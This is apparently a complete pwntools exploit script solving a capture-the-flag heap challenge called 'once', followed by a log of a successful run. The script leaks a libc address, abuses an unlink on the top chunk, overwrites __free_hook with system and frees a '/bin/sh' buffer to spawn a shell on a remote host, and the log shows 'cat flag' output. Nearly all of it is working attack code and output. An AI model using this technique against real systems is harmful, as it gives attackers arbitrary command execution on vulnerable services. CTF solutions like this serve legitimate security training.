from pwn import *
import time
import sys

def once(DEBUG):
	t = 0.5
	if DEBUG=="1":		
		r = process("./once")
		raw_input("debug?")
	elif DEBUG=="2":
		r = process("./once", env={"LD_PRELOAD":"./libc-2.23.so"})
		raw_input("debug?")
	elif DEBUG=="3":
		t = 0.03
		HOST = '47.75.189.102'
		PORT = 9999
		r = remote(HOST,PORT)
	
	def getPuts():
		r.sendline()
		r.recvuntil("Invalid choice\n")
		return r.recvuntil(">")[:-1]
		
	def initList():
		r.sendline("1")
		return r.recvuntil("> ")
	
	def readItem(payload):
		r.sendline("2"+"\x00"*6)
		r.send(payload)
		time.sleep(t)
		return r.recvuntil("> ")
	
	def unlink():
		r.sendline("3")
		return r.recvuntil("> ")
	
	def malloc(size):
		r.sendline("4")
		r.recvuntil("> ")
		r.sendline("1")
		r.recvuntil("input size:\n")
		r.sendline(str(size))
		return r.recvuntil("> ")
	
	def readPtr(payload):
		r.sendline("4")
		r.recvuntil("> ")
		r.sendline("2"+"\x00"*6)
		r.sendline(payload)
		return r.recvuntil("> ")
	
	def freePtr():
		r.sendline("4")
		r.recvuntil("> ")
		r.sendline("3")
		return r.recvuntil("> ")
		
	offset_puts = 0x6f690
	offset_main_arena = 0x3c4b20
	offset_system = 0x45390
	offset_stdout = 0x3c5620
	offset_stdin = 0x3c48e0
	
	PTR = 0x555555756068
	CHECKFREE = 0x555555756070
	
	r.recvuntil("> ")
	res = getPuts()
	puts = int(res, 16)
	baselibc = puts - offset_puts
	main_arena = baselibc + offset_main_arena
	top_chunk = main_arena + 0x58
	system = baselibc + offset_system
	stdout = baselibc + offset_stdout
	stdin = baselibc + offset_stdin
	free_hook = main_arena + 0x1c88
	log.info('baselibc: %#x' % baselibc)
	log.info('main_arena: %#x' % main_arena)
	log.info('top_chunk: %#x' % top_chunk)
	log.info('puts: %#x' % puts)
	log.info("system: %#x" % system)
	log.info("stdout: %#x" % stdout)
	log.info("stdin: %#x" % stdin)
	
	payload = p64(0)
	payload += p64(0x2001)
	payload += p64(0)
	payload += p64(top_chunk - 0x10)
	readItem(payload)
	initList()
	unlink()
	
	malloc(300)
	
	payload = "/bin/sh\x00"
	payload += p64(free_hook)
	payload += p64(stdout)
	payload += p64(0)
	payload += p64(stdin)
	payload += p64(0)
	payload += p64(0)
	readItem(payload)
	
	payload = p64(system)
	readPtr(payload)
	
	r.sendline("4")
	r.recvuntil("> ")
	r.sendline("3")
	r.interactive()

once(sys.argv[1])
"""
$ python once.py 3
[+] Opening connection to 47.75.189.102 on port 9999: Done
[*] baselibc: 0x7f8778d74000
[*] main_arena: 0x7f8779138b20
[*] top_chunk: 0x7f8779138b78
[*] puts: 0x7f8778de3690
[*] system: 0x7f8778db9390
[*] stdout: 0x7f8779139620
[*] stdin: 0x7f87791388e0
[*] Switching to interactive mode
$ cat flag
HITB{this_is_the_xxxxxxx_flag}
$  
"""